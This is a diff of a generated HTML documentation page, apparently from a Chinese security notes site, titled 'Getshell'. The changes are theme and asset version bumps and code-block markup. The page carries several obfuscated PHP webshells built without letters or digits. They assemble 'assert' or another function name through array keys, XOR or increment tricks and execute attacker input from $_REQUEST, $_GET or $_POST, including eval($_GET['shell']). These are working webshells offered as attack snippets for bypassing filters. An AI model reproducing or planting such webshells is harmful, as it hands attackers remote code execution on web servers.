@@ -38,7 +38,7 @@
         <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
       
       <link rel="shortcut icon" href="../../../..">
-      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.2">
     
     
       
@@ -46,9 +46,9 @@
       
     
     
-      <link rel="stylesheet" href="../../../../assets/stylesheets/application.e194128b.css">
+      <link rel="stylesheet" href="../../../../assets/stylesheets/application.adb8469c.css">
       
-        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.3e3d1dff.css">
+        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.a8b3c06d.css">
       
       
         
@@ -57,7 +57,7 @@
       
     
     
-      <script src="../../../../assets/javascripts/modernizr.74668098.js"></script>
+      <script src="../../../../assets/javascripts/modernizr.86422ebf.js"></script>
     
     
       
@@ -2802,16 +2802,16 @@
                   <h1>Getshell</h1>
                 
                 <h2 id="shell-php5">不包含数字和字母的shell（待验证） php5<a class="headerlink" href="#shell-php5" title="Permanent link">&para;</a></h2>
-<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span> <span class="nv">$p</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;f&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;pffff&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;s&#39;</span><span class="p">,</span><span class="s1">&#39;e&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;fffff&#39;</span><span class="p">,</span><span class="s1">&#39;lfaaaa&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;r&#39;</span><span class="p">,</span><span class="s1">&#39;nnnnn&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;t&#39;</span><span class="p">);</span><span class="nv">$a</span> <span class="o">=</span> <span class="nb">array_keys</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span><span class="nv">$_</span><span class="o">=</span><span class="nv">$p</span><span class="p">[</span><span class="s1">&#39;pffff&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$p</span><span class="p">[</span><span class="s1">&#39;pffff&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$a</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span><span class="nv">$_</span><span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">.</span><span class="nv">$_</span><span class="o">.</span><span class="s1">&#39;rt&#39;</span><span class="p">;</span><span class="nv">$_</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]));</span><span class="cp">?&gt;</span><span class="x"></span>
-</pre></div>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="nv">$p</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;f&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;pffff&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;s&#39;</span><span class="p">,</span><span class="s1">&#39;e&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;fffff&#39;</span><span class="p">,</span><span class="s1">&#39;lfaaaa&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;r&#39;</span><span class="p">,</span><span class="s1">&#39;nnnnn&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;t&#39;</span><span class="p">);</span><span class="nv">$a</span> <span class="o">=</span> <span class="nb">array_keys</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span><span class="nv">$_</span><span class="o">=</span><span class="nv">$p</span><span class="p">[</span><span class="s1">&#39;pffff&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$p</span><span class="p">[</span><span class="s1">&#39;pffff&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$a</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span><span class="nv">$_</span><span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">.</span><span class="nv">$_</span><span class="o">.</span><span class="s1">&#39;rt&#39;</span><span class="p">;</span><span class="nv">$_</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]));</span><span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
 
-<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
 <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/[a-z0-9]/is&#39;</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;shell&#39;</span><span class="p">]))</span> <span class="p">{</span>
   <span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;shell&#39;</span><span class="p">]);</span>
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
-<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
 <span class="nv">$__</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="o">&gt;</span><span class="s1">&#39;&lt;&#39;</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="o">&gt;</span><span class="s1">&#39;&lt;&#39;</span><span class="p">);</span>
 <span class="nv">$_</span><span class="o">=</span><span class="nv">$__</span><span class="o">/</span><span class="nv">$__</span><span class="p">;</span>
 
@@ -2822,9 +2822,9 @@
 
 <span class="nv">$_</span><span class="o">=</span><span class="nv">$$_____</span><span class="p">;</span>
 <span class="nv">$____</span><span class="p">(</span><span class="nv">$_</span><span class="p">[</span><span class="nv">$__</span><span class="p">]);</span>
-</pre></div>
+</code></pre></div>
 
-<div class="codehilite"><pre><span></span><span class="x">// ASSERT($_POST[_]); 记得删除注释</span>
+<div class="codehilite"><pre><span></span><code><span class="x">// ASSERT($_POST[_]); 记得删除注释</span>
 <span class="cp">&lt;?php</span>
 <span class="nv">$_</span><span class="o">=</span><span class="p">[];</span>
 <span class="nv">$_</span><span class="o">=@</span><span class="s2">&quot;</span><span class="si">$_</span><span class="s2">&quot;</span><span class="p">;</span> <span class="c1">// $_=&#39;Array&#39;;</span>
@@ -2860,7 +2860,7 @@
 
 <span class="nv">$_</span><span class="o">=</span><span class="nv">$$____</span><span class="p">;</span>
 <span class="nv">$___</span><span class="p">(</span><span class="nv">$_</span><span class="p">[</span><span class="nx">_</span><span class="p">]);</span> 
-</pre></div>
+</code></pre></div>
                 
                   
                 
@@ -2960,7 +2960,7 @@
       
     </div>
     
-      <script src="../../../../assets/javascripts/application.970603a6.js"></script>
+      <script src="../../../../assets/javascripts/application.df00da5d.js"></script>
       
         
         
